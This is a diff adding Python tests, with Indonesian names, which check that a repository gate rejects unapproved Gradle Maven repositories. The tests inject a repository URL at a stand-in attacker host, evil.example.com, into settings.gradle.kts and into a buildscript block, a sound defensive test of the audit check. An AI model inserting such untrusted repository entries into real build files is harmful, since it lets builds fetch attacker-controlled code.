@@ -124,6 +124,35 @@ def _bagian_awal(tmp):
             rc != 0 and "FAIL_ON_PROJECT_REPOS" in out)
     shutil.rmtree(gradle, ignore_errors=True)
 
+    gradle2 = klon(tmp, "gradle2")
+    berkas_settings2 = os.path.join(gradle2, "settings.gradle.kts")
+    with open(berkas_settings2, encoding="utf-8") as f:
+        isi_settings2 = f.read()
+    with open(berkas_settings2, "w", encoding="utf-8") as f:
+        f.write(isi_settings2.replace(
+            "        google()\n        mavenCentral()\n    }",
+            "        google()\n        mavenCentral()\n"
+            "        maven { url = \"https://evil.example.com/maven\" }\n    }", 1))
+    rc, out = jalan(gradle2, [sys.executable, GERBANG, "--semua"])
+    periksa("repositori maven tanpa kurung di settings: gerbang gagal "
+            "(Audit 2898)",
+            rc != 0 and "tak diizinkan" in out)
+    shutil.rmtree(gradle2, ignore_errors=True)
+
+    gradle3 = klon(tmp, "gradle3")
+    berkas_akar3 = os.path.join(gradle3, "build.gradle.kts")
+    with open(berkas_akar3, encoding="utf-8") as f:
+        isi_akar3 = f.read()
+    with open(berkas_akar3, "w", encoding="utf-8") as f:
+        f.write(isi_akar3 + "\nbuildscript {\n    repositories {\n"
+                "        maven { url = uri(\"https://evil.example.com\") }\n"
+                "    }\n}\n")
+    rc, out = jalan(gradle3, [sys.executable, GERBANG, "--semua"])
+    periksa("repositori buildscript di build.gradle.kts akar: gerbang "
+            "gagal (Audit 2898)",
+            rc != 0 and "tak diizinkan" in out)
+    shutil.rmtree(gradle3, ignore_errors=True)
+
     umpan = klon(tmp, "umpan")
     berkas_ump = os.path.join(umpan, ".github", "actions",
                               "resolve-vw", "action.yml")
